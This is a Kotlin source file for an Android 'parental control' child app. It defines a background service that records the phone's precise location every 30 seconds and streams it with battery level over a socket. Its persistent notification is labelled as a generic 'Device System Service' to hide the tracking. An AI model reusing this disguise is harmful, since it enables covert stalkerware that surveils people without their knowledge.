package com.parentalcontrol.child.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.parentalcontrol.child.MainActivity
import com.parentalcontrol.child.data.AppDatabase
import com.parentalcontrol.child.data.LocationRecordEntity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.parentalcontrol.child.network.SocketManager

class LocationTrackerService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private val CHANNEL_ID = "LocationServiceChannel"
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    processLocation(location)
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device System Service")
            .setContentText("Running background tasks")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()

        startForeground(1, notification)
        
        // Ensure SocketManager is initialized to keep connection alive
        SocketManager.init(applicationContext)

        startLocationUpdates()

        return START_STICKY
    }

    private fun startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("LocationTracker", "Location permission not granted")
            return
        }

        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 30000)
            .setMinUpdateIntervalMillis(15000)
            .build()

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )
    }

    private fun processLocation(location: Location) {
        Log.d("LocationTracker", "REAL LOCATION UPDATE RECEIVED")
        serviceScope.launch {
            val loc = LocationRecordEntity(
                latitude = location.latitude,
                longitude = location.longitude,
                accuracy = location.accuracy,
                altitude = if (location.hasAltitude()) location.altitude else null,
                speed = if (location.hasSpeed()) location.speed else null,
                heading = if (location.hasBearing()) location.bearing else null,
                battery = getBatteryLevel(applicationContext),
                source = location.provider ?: "fused",
                timestamp = location.time
            )
            
            val db = AppDatabase.getDatabase(applicationContext)
            
            val count = db.locationRecordDao().getCount()
            if (count > 10000) {
                db.locationRecordDao().deleteOldest(100)
            }
            
            db.locationRecordDao().insertLocation(loc)
            
            // Send heartbeat and location
            SocketManager.emitHeartbeat(loc.battery ?: 100)
            SocketManager.emitLocation(loc.latitude, loc.longitude, loc.accuracy, loc.battery ?: 100)
        }
    }

    private fun getBatteryLevel(context: Context): Int {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) {
            (level * 100 / scale.toFloat()).toInt()
        } else {
            100
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
        SocketManager.disconnect()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "System Background Tasks",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }
}
